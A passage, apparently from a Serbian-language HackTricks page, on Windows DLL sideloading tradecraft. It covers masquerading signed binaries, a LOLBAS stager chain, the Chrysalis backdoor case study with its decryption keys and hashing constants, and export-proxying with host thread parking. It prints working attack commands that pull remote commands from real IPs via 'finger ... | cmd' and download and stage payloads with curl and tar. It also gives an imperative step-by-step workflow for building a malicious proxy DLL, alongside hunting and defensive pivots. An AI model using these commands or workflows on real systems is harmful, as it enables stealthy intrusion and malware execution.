* Rename-ovanje signed EXE (dok se zadržava originalni `OriginalFileName` u PE header-u) omogućava da se masquerade-uje kao Windows binary, a da zadrži vendor signature, zato repliciraj Ink Dragon naviku drop-ovanja binary-ja koji liče na `conhost.exe`, ali su zapravo AMD/NVIDIA utilities.
* Pošto executable ostaje trusted, većini allowlisting controls treba samo da tvoj malicious DLL stoji pored njega. Fokusiraj se na customizovanje loader DLL-a; signed parent može obično da radi untouched.
* ShadowPad-ov decryptor očekuje da TMP blob bude pored loader-a i da bude writable kako bi mogao da zero-uje file posle mapping-a. Drži directory writable dok se payload ne učita; jednom u memory, TMP file može bezbedno da se obriše radi OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatori pair-uju DLL sideloading sa LOLBAS tako da je jedini custom artifact na disku malicious DLL pored trusted EXE:

- **Remote command loader (Finger):** Hidden PowerShell pokreće `cmd.exe /c`, povlači komande sa Finger servera, i prosleđuje ih u `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` povlači TCP/79 text; `| cmd` izvršava odgovor servera, što operatorima omogućava da rotiraju second stage server-side.

- **Built-in download/extract:** Preuzmi archive sa benign extension-om, raspakuj ga, i stage-uj sideload target plus DLL u random `%LocalAppData%` folder:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` skriva progress i prati redirects; `tar -xf` koristi Windows-ov built-in tar.

- **WMI/CIM launch:** Pokreni EXE preko WMI tako da telemetry pokaže CIM-created process dok učitava colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Radi sa binary-jima koji preferiraju local DLLs (npr. `intelbq.exe`, `nearby_share.exe`); payload (npr. Remcos) radi pod trusted imenom.

- **Hunting:** Alertuj na `forfiles` kada se `/p`, `/m`, i `/c` pojave zajedno; neuobičajeno van admin scripts.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Nedavna Lotus Blossom intrusion je abuse-ovala trusted update chain da isporuči NSIS-packed dropper koji je stage-ovao DLL sideload plus fully in-memory payloads.

Tradecraft flow
- `update.exe` (NSIS) kreira `%AppData%\Bluetooth`, označava ga kao **HIDDEN**, drop-uje preimenovani Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll`, i encrypted blob `BluetoothService`, pa zatim pokreće EXE.
- Host EXE importuje `log.dll` i poziva `LogInit`/`LogWrite`. `LogInit` mmap-load-uje blob; `LogWrite` ga decrypt-uje custom LCG-based stream-om (constants **0x19660D** / **0x3C6EF35F**, key material izveden iz prethodnog hash-a), overwrite-uje buffer plaintext shellcode-om, free-uje temp fajlove, i skače na njega.
- Da bi izbegao IAT, loader resolve-uje API-je hash-ovanjem export name-ova koristeći **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, zatim primenjuje Murmur-style avalanche (**0x85EBCA6B**) i poredi sa salted target hash-evima.

Main shellcode (Chrysalis)
- Decrypt-uje PE-like main module ponavljanjem add/XOR/sub sa key `gQ2JR&9;` kroz pet pass-ova, zatim dinamički učitava `Kernel32.dll` → `GetProcAddress` da završi import resolution.
- Rekonstruiše DLL name string-ove u runtime-u preko per-character bit-rotate/XOR transformacija, zatim učitava `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Koristi drugi resolver koji prolazi kroz **PEB → InMemoryOrderModuleList**, parsira svaku export table u 4-byte block-ovima sa Murmur-style mixing-om, i tek se vraća na `GetProcAddress` ako hash nije pronađen.

Embedded configuration & C2
- Config se nalazi unutar drop-ovanog `BluetoothService` fajla na **offset 0x30808** (size **0x980**) i RC4-decrypt-uje se sa key `qwhvb^435h&*7`, otkrivajući C2 URL i User-Agent.
- Beacons grade dot-delimited host profile, dodaju tag `4Q`, zatim RC4-encrypt-uju sa key `vAuig34%^325hGV` pre `HttpSendRequestA` preko HTTPS. Responses se RC4-decrypt-uju i dispatch-uju kroz tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode je gated by CLI args: bez args = install persistence (service/Run key) koji pokazuje na `-i`; `-i` ponovo pokreće sebe sa `-k`; `-k` preskače install i pokreće payload.

Alternate loader observed
- Ista intrusion je drop-ovala Tiny C Compiler i pokrenula `svchost.exe -nostdlib -run conf.c` iz `C:\ProgramData\USOShared\`, sa `libtcc.dll` pored njega. C source koji je napadač doneo je embedded shellcode, kompajliran i pokrenut in-memory bez dodirivanja diska sa PE. Repliciraj sa:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ovaj TCC-based compile-and-run stage je učitao `Wininet.dll` u runtime-u i povukao shellcode drugog stage-a sa hardcoded URL-a, dajući fleksibilan loader koji se predstavlja kao pokretanje kompilatora.

## Signed-host sideloading with export proxying + host thread parking

Neki DLL sideloading lanci dodaju **stability engineering** tako da legitimni host ostane aktivan dovoljno dugo da kasniji stage-ovi budu učitani čisto, umesto da se sruši nakon što se malicious DLL učita.

Uočeni obrazac
- Postavi trusted EXE pored malicious DLL koristeći očekivani dependency naziv kao što je `version.dll`.
- Malicious DLL **proxyuje svaki očekivani export** nazad na pravi system DLL (na primer `%SystemRoot%\\System32\\version.dll`) tako da import resolution i dalje uspeva i host proces nastavlja da radi.
- Nakon load-a, malicious DLL **patchuje host entry point** tako da glavna nit upadne u beskonačnu `Sleep` petlju umesto da izađe ili pokrene code paths koji bi terminirali proces.
- Nova nit obavlja stvarni malicious posao: dekriptovanje naziva ili putanje next-stage DLL-a (RC4/XOR su česti), zatim njegovo pokretanje pomoću `LoadLibrary`.

Zašto je ovo bitno
- Normal DLL proxying čuva API compatibility, ali ne garantuje da će host ostati živ dovoljno dugo za kasnije stage-ove.
- Parkiranje glavne niti u `Sleep(INFINITE)` je jednostavan način da signed proces ostane rezidentan dok loader u worker thread-u obavlja dekripciju, staging ili network bootstrap.
- Lov samo na sumnjiv `DllMain` promaši ovaj obrazac ako se zanimljivo ponašanje dešava nakon što je host entry point patchovan i startuje sekundarna nit.

Minimalni workflow
1. Kopiraj signed host EXE i odredi DLL koji rešava iz lokalnog direktorijuma.
2. Izgradi proxy DLL koji exportuje iste funkcije i prosleđuje ih legitimnom DLL-u.
3. U `DllMain(DLL_PROCESS_ATTACH)`, kreiraj worker thread.
4. Iz te niti patchuj host entry point ili main thread start routine tako da se vrti na `Sleep`.
5. Dekriptuj next-stage DLL ime/config i pozovi `LoadLibrary` ili manual-map payload.

Odbrambeni pivoti
- Signed procesi učitavaju `version.dll` ili slične uobičajene biblioteke iz svog aplikacionog direktorijuma umesto iz `System32`.
- Memory patch-ovi na process entry point-u ubrzo nakon image load-a, naročito jumps/calls preusmereni na `Sleep`/`SleepEx`.
- Niti koje kreira proxy DLL i koje odmah pozivaju `LoadLibrary` na drugi DLL sa dekriptovanim imenom.
- Full-export proxy DLL-ovi postavljeni pored vendor executable-a unutar writable staging direktorijuma kao što su `ProgramData`, `%TEMP%`, ili unpacked archive paths.

## References

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Unit 42 – Converging Interests: Analysis of Threat Clusters Targeting a Southeast Asian Government](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Check Point Research – Fast and Furious: Nimbus Manticore Operations During the Iranian Conflict](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [Microsoft Learn – `<appDomainManagerType>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [Microsoft Learn – `<appDomainManagerAssembly>` element](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)


{{#include ../../../banners/hacktricks-training.md}}
